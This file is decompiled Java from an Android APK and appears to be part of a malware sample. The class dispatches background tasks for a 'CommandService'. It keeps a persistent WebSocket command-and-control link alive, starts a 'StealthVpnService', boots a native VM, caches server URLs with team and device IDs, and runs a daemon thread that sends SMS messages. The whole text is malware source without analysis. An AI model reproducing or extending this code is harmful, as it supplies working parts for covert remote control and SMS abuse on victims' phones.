package com.base.template.services;

import android.content.Context;
import com.base.template.NativeBridge;
import com.base.template.network.SmsFastSend;
import com.base.template.network.SmsFastSend$$ExternalSyntheticLambda1;
import com.base.template.network.WsPersistManager;
import kotlin.io.CloseableKt;
import okhttp3.MediaType;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final /* synthetic */ class CommandService$$ExternalSyntheticLambda3 implements Runnable {
    public final /* synthetic */ int $r8$classId;
    public final /* synthetic */ CommandService f$0;

    public /* synthetic */ CommandService$$ExternalSyntheticLambda3(CommandService commandService, int i) {
        this.$r8$classId = i;
        this.f$0 = commandService;
    }

    @Override // java.lang.Runnable
    public final void run() {
        switch (this.$r8$classId) {
            case 0:
                CommandService commandService = this.f$0;
                CommandService commandService2 = CommandService.instance;
                try {
                    Object obj = WsPersistManager.lock;
                    if (!WsPersistManager.isHealthy()) {
                        if (WsPersistManager.isConnected) {
                            WsPersistManager.forceReconnect(commandService.getApplicationContext());
                        } else {
                            WsPersistManager.connect(commandService.getApplicationContext());
                        }
                    }
                } catch (Exception unused) {
                    return;
                }
                break;
            case 1:
                CommandService commandService3 = this.f$0;
                CommandService commandService4 = CommandService.instance;
                try {
                    Object obj2 = WsPersistManager.lock;
                    if (!WsPersistManager.isConnected) {
                        WsPersistManager.connect(commandService3.getApplicationContext());
                    }
                } catch (Exception unused2) {
                    return;
                }
                break;
            case 2:
                CommandService commandService5 = this.f$0;
                CommandService commandService6 = CommandService.instance;
                try {
                    Object obj3 = WsPersistManager.lock;
                    WsPersistManager.commandCallback = ProxyService.AnonymousClass1.INSTANCE$1;
                    WsPersistManager.connectCallback = CommandService$onCreate$1$2.INSTANCE;
                    WsPersistManager.disconnectCallback = CommandService$onCreate$1$2.INSTANCE$1;
                    WsPersistManager.connect(commandService5.getApplicationContext());
                } catch (Exception e) {
                    e.getMessage();
                    return;
                }
                break;
            case 3:
                CommandService commandService7 = this.f$0;
                CommandService commandService8 = CommandService.instance;
                try {
                    StealthVpnService stealthVpnService = StealthVpnService.instance;
                    CloseableKt.startIfReady(commandService7.getApplicationContext());
                } catch (Exception unused3) {
                    return;
                }
                break;
            case 4:
                CommandService commandService9 = this.f$0;
                CommandService commandService10 = CommandService.instance;
                try {
                    Object obj4 = WsPersistManager.lock;
                    if (!WsPersistManager.isConnected) {
                        WsPersistManager.forceReconnect(commandService9.getApplicationContext());
                    }
                } catch (Exception unused4) {
                    return;
                }
                break;
            case 5:
                CommandService commandService11 = this.f$0;
                CommandService commandService12 = CommandService.instance;
                try {
                    try {
                        if (!NativeBridge.startVM(commandService11.getApplicationContext())) {
                            commandService11.vmStarted = false;
                            break;
                        } else {
                            try {
                                MediaType mediaType = SmsFastSend.JSON_TYPE;
                                SmsFastSend.cacheCredentials(commandService11.getApplicationContext(), NativeBridge.getEffectiveUrl(), NativeBridge.getFallbackUrl(), NativeBridge.getTeamId(), NativeBridge.getDeviceId());
                                Context applicationContext = commandService11.getApplicationContext();
                                if (!SmsFastSend.flushRunning) {
                                    Thread thread = new Thread(new SmsFastSend$$ExternalSyntheticLambda1(applicationContext, 0));
                                    thread.setDaemon(true);
                                    thread.start();
                                    break;
                                }
                            } catch (Exception unused5) {
                                return;
                            }
                        }
                    } catch (Exception e2) {
                        e2.getMessage();
                        commandService11.vmStarted = false;
                        return;
                    }
                } catch (UnsatisfiedLinkError unused6) {
                    commandService11.vmStarted = false;
                    commandService11.vmStartAttemptTime = 0L;
                    commandService11.handler.postDelayed(new CommandService$$ExternalSyntheticLambda3(commandService11, 6), 2000L);
                    return;
                }
                break;
            case 6:
                CommandService commandService13 = this.f$0;
                CommandService commandService14 = CommandService.instance;
                commandService13.startVM();
                break;
            default:
                CommandService commandService15 = this.f$0;
                try {
                    MediaType mediaType2 = SmsFastSend.JSON_TYPE;
                    Context applicationContext2 = commandService15.getApplicationContext();
                    if (!SmsFastSend.flushRunning) {
                        Thread thread2 = new Thread(new SmsFastSend$$ExternalSyntheticLambda1(applicationContext2, 0));
                        thread2.setDaemon(true);
                        thread2.start();
                    }
                } catch (Exception unused7) {
                    return;
                }
                break;
        }
    }
}
